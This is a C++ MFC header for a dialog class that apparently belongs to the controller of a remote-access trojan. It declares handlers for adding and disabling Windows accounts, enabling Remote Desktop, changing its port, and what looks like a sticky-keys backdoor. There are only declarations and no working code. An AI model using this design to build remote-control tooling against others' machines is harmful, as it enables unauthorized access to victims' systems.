#if !defined(AFX_USER_H__63A8EF47_2214_4927_A9A5_0B805975788F__INCLUDED_)
#define AFX_USER_H__63A8EF47_2214_4927_A9A5_0B805975788F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// User.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CUser dialog

class CUser : public CDialog
{
// Construction
public:
	CUser(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	virtual void Remotedesktop(CString Net_ips,CString Net_Ports,CString Net_users,CString Net_passs);
// Dialog Data
	//{{AFX_DATA(CUser)
	enum { IDD = IDD_ADD_USER };
	CListCtrl	m_Server_yjx;
	CListCtrl	m_Server_yhx;
	CTabCtrl	m_Server_tab;
	CString	m_admin;
	CString	m_net_pass;
	CString	m_net_user;
	CString	m_Port1;
	CString m_net_ip;
	CString SerPort_P;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CUser)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CUser)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnS3389();
	afx_msg void OnKs3389();
	afx_msg void OnNetAdd();
	afx_msg void OnSelchangeServertab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void ServertabWindow();
	afx_msg void GetProcess_yhx();
	afx_msg void GetProcess_yjx();
	afx_msg void OnClickServeryjx(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnClickServeryhx(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSERsx();
	afx_msg void OnSERqy();
	afx_msg void OnSERjy();
	afx_msg void Seruer_shezhi(UINT User_p);   //帐户设置函数 启用/禁用
	afx_msg void OnSERsc();
	afx_msg void OnSERCipher();
	afx_msg void OnLONGRANGEPortMod();
	afx_msg void OnLj3389();
	afx_msg void OnChangeEDITuser();
	afx_msg void OnChangeEDITpass();
	afx_msg void OnNetPreservations();   //保存修改
	afx_msg void OnShiftosk();
	virtual void OnCancel();
	//}}AFX_MSG
	void AdjustListr();
	void ShowProcessListp();


	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CImageList     m_ImgList;

	CListCtrl* m_pLogListr;

	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_USER_H__63A8EF47_2214_4927_A9A5_0B805975788F__INCLUDED_)
